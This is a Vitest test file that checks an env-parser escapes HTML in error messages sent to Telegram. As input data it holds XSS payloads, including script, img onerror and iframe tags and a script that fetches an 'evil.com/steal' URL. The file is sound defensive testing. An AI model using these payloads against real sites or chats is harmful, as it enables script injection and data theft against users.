/**
 * HTML Injection Security Tests for env-parser
 * Verifies that user input in error messages is properly escaped
 */
import { describe, it, expect } from 'vitest';
import { parseEnvVariables, formatParseError } from '../src/mcp/env-parser';

describe('env-parser HTML Injection Security', () => {
  describe('formatParseError escaping', () => {
    it('should escape HTML in error messages from sanitizeErrorForUser', () => {
      // Use a key without quotes to trigger an error that includes the key name
      const maliciousInput = '<script>alert("XSS")</script>';
      
      try {
        parseEnvVariables(maliciousInput);
      } catch (error) {
        const formatted = formatParseError(error);
        
        // Should NOT contain raw HTML tags
        expect(formatted).not.toContain('<script>');
        expect(formatted).not.toContain('</script>');
        
        // The error message should be properly escaped
        expect(formatted).toMatch(/Error (al parsear|parsing) environment variables?:/i);
      }
    });

    it('should escape < and > characters', () => {
      const input = '<img src=x>=value';
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const formatted = formatParseError(error);
        
        expect(formatted).not.toContain('<img');
        expect(formatted).toContain('&lt;img');
      }
    });

    it('should escape ampersand in error messages', () => {
      const input = 'KEY&malicious=value';
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const formatted = formatParseError(error);
        
        // Should escape ampersand if it appears in error
        if (formatted.includes('KEY')) {
          expect(formatted).toMatch(/&amp;|KEY/);
        }
      }
    });
  });

  describe('Error messages with malicious keys', () => {
    it('should escape HTML in missing value error', () => {
      const maliciousKey = '<b>MALICIOUS</b>';
      const input = `${maliciousKey}=`;
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const message = error instanceof Error ? error.message : '';
        
        // Should NOT contain raw HTML tags
        expect(message).not.toContain('<b>');
        expect(message).not.toContain('</b>');
        
        // Should contain escaped HTML
        expect(message).toContain('&lt;b&gt;');
        expect(message).toContain('&lt;/b&gt;');
      }
    });

    it('should escape HTML in empty value error', () => {
      const maliciousKey = '<script>alert(1)</script>';
      const input = `${maliciousKey}=,KEY2=value`;
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const message = error instanceof Error ? error.message : '';
        
        // Should escape the script tag
        expect(message).not.toContain('<script>');
        expect(message).toContain('&lt;script&gt;');
      }
    });

    it('should handle multiple attack vectors in single key', () => {
      const maliciousKey = '<img src=x onerror=alert(1)>';
      const input = `${maliciousKey}=`;
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const message = error instanceof Error ? error.message : '';
        
        expect(message).not.toContain('<img');
        expect(message).not.toContain('onerror=');
        expect(message).toContain('&lt;img');
        expect(message).toContain('&gt;');
      }
    });
  });

  describe('Integration with Telegram HTML mode', () => {
    it('should produce safe output for parse_mode: HTML', () => {
      const maliciousInput = '<iframe src="evil.com"></iframe>=value';
      
      try {
        parseEnvVariables(maliciousInput);
      } catch (error) {
        const formatted = formatParseError(error);
        
        // This message would be sent via Telegram with parse_mode: 'HTML'
        // Should not contain any unescaped HTML
        expect(formatted).not.toContain('<iframe');
        expect(formatted).not.toContain('</iframe>');
        expect(formatted).toContain('&lt;iframe');
        expect(formatted).toContain('&lt;/iframe&gt;');
      }
    });

    it('should handle nested HTML injection attempts', () => {
      const maliciousInput = '<b><i><u>NESTED</u></i></b>=value';
      
      try {
        parseEnvVariables(maliciousInput);
      } catch (error) {
        const formatted = formatParseError(error);
        
        // All tags should be escaped
        expect(formatted).not.toContain('<b>');
        expect(formatted).not.toContain('<i>');
        expect(formatted).not.toContain('<u>');
        expect(formatted).toContain('&lt;b&gt;');
        expect(formatted).toContain('&lt;i&gt;');
        expect(formatted).toContain('&lt;u&gt;');
      }
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent XSS via error message in Telegram chat', () => {
      // Attacker tries to inject JavaScript via malformed env var (missing value)
      const attackPayload = '<script>fetch("https://evil.com/steal")</script>';
      const input = `${attackPayload}=`;
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const formatted = formatParseError(error);
        
        // The error message will be sent to Telegram with parse_mode: 'HTML'
        // It MUST NOT contain unescaped HTML
        expect(formatted).not.toContain('<script>');
        expect(formatted).not.toContain('</script>');
        
        // Error message should be safe
        expect(formatted).toMatch(/Error (al parsear|parsing) environment variables?:/i);
      }
    });

    it('should handle onclick handlers in error messages', () => {
      const input = '<div onclick="alert(1)">KEY</div>=value';
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const formatted = formatParseError(error);
        
        expect(formatted).not.toContain('<div');
        expect(formatted).not.toContain('onclick=');
        expect(formatted).toContain('&lt;div');
      }
    });

    it('should escape data URIs in error messages', () => {
      const input = '<img src="data:text/html,<script>alert(1)</script>">=value';
      
      try {
        parseEnvVariables(input);
      } catch (error) {
        const formatted = formatParseError(error);
        
        expect(formatted).not.toContain('<img');
        expect(formatted).not.toContain('<script>');
        expect(formatted).toContain('&lt;img');
        expect(formatted).toContain('&lt;script&gt;');
      }
    });
  });
});
